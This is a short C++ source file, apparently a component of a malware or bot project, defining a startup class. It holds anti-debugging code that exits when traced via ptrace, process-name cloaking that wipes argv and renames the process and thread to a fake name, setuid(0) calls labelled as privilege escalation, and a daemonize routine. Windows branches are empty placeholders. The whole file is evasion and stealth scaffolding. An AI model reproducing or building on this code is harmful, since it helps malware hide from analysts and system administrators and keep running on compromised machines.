extern "C" {
    #ifdef __linux__
        #include <unistd.h>
        #include <sys/ptrace.h>
        #include <signal.h>
        #include <sys/prctl.h>
    #elif _WIN32
        // windows code goes here
    #else
    #endif
}


class startup {
    public:
        void detect_debugging(void) {
            #ifdef __linux__
                if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti-debugging
                   exit(0);
                }
            #elif _WIN32
                // windows code goes here
            #else
            #endif
        }

        void misc_os(void) {
            #ifdef __linux__
                signal(SIGPIPE, SIG_IGN);
                signal(SIGCHLD, SIG_IGN); // fuck zombie process's
            #elif _WIN32
                // windows code goes here
            #else
            #endif
        }

        void cloak_name(int argc, char *argv[]) {
            for(int i=0;i<argc;i++){
                memset(argv[i],'\x0',strlen(argv[i])); // we need to remove the sys args
            }
            strcpy(argv[0], FAKE_NAME); // cloak, command name
            #ifdef __linux__
                prctl(PR_SET_NAME, FAKE_NAME); // cloak, thread name
            #elif _WIN32
                // windows code goes here
            #else
            #endif
        }

        void priv_esc(void) {
            #ifdef __linux__
                setuid(0);
                setreuid(0, 0);
            #elif _WIN32
                // windows code goes here
            #else
            #endif
        }

        void daemonize(void) {
            #ifdef __linux__
                daemon(true, false);
            #elif _WIN32
                // windows code goes here
            #else
            #endif
        }
};